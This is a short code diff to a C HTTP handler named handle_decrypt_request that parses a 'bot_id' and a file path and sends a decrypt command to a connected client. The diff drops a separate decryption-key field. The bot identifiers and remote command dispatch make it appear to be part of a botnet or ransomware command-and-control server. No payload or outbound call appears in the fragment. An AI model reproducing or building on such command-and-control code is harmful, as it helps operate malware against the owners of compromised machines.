@@ -222,7 +222,6 @@ void handle_decrypt_request(struct mg_connection *c, struct mg_http_message *hm)
     // Parse fields from the POST request
     mg_http_get_var(&hm->body, "bot_id", bot_id, sizeof(bot_id));
     mg_http_get_var(&hm->body, "file_path", file_path, sizeof(file_path));
-    mg_http_get_var(&hm->body, "key", key, sizeof(key));
 
     // Validate required fields
     if (strlen(bot_id) == 0) {
@@ -232,10 +231,6 @@ void handle_decrypt_request(struct mg_connection *c, struct mg_http_message *hm)
 
     if (strlen(file_path) == 0) {
         mg_http_reply(c, 400, "Content-Type: application/json\r\n", "{\"error\":\"File path is required\"}");
-        return;
-    }
-    if (strlen(key) == 0) {
-        mg_http_reply(c, 400, "Content-Type: application/json\r\n", "{\"error\":\"Decrypt key is required\"}");
         return;
     }
 
@@ -257,8 +252,7 @@ void handle_decrypt_request(struct mg_connection *c, struct mg_http_message *hm)
     };
 
     cmd.params[0] = strdup(file_path); // Add the file path as the first parameter
-    cmd.params[1] = strdup(key); // Add the decryption key as the second parameter
-    cmd.params[2] = NULL; // Null-terminate the params array
+    cmd.params[1] = NULL; // Null-terminate the params array
 
     // Send the command to the client
     if (send_command(client->socket, &cmd) < 0) {
